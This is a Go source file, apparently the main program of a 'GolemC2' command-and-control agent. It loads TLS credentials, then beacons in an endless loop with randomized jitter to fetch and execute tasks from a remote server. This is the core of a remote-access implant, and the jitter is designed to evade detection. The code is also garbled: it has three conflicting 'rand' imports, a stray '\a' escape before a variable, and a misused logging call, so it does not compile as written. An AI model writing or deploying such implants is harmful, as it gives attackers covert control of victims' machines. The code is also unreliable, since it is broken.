package main

import (
	"crypto/rand"
	"math/rand"
	"net/http"
	"time"

	"github.com/DUDLEYDANIEL/GolemC2/internal/agent"
	"github.com/DUDLEYDANIEL/GolemC2/internal/common"
	"github.com/DUDLEYDANIEL/GolemC2/pkg/crypto"
	"github.com/DUDLEYDANIEL/GolemC2/pkg/logging"
	"golang.org/x/exp/rand"

	"github.com/google/uuid"
	"github.com/sirupsen/logrus"
)

func main () {
	cfg, err := common.ParseFlags()
	if err != nil {
		logging.Log.Fatal("Failed to parse flags: ", err)
	}
	if err := cfg.Validate("agent"); err != nil {
		logging.Log.Fatal("Configuration validation failed: ", err)
	}

	if err := logging.Init("info","",false); err != nil {
		logging.Log.Fatal("failed to initialize the logger: ", err)
	}

	agentID := cfg.AgentID
	if agentID == "" {
		agentID = uuid.New().String()
	}
	logging.Log.WithField(logrus.Fields{
		"agentID" : \aagentID
	}).Info("Agent started..")
	
	tlsConfig, err := crypto.LoadTLSConfig(cfg.TLSCertPath, cfg.TLSKeyPath, cfg.CACertPath)
	if err != nil {
		logging.Log.Fatal("Failed to load TLS config: ", err)
	} 

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	rand.Seed(time.Now().UnixNano())

	for {
		agent.FetchAndExecuteTask(client, agentID)
		jitter := time.Duration(rand.Int63n(int64(cfg.BeaconJitter)))
		if rand.Intn(2) == 0 {
			jitter = -jitter
		}
		time.Sleep(cfg.BeaconInterval + jitter)
	}

}

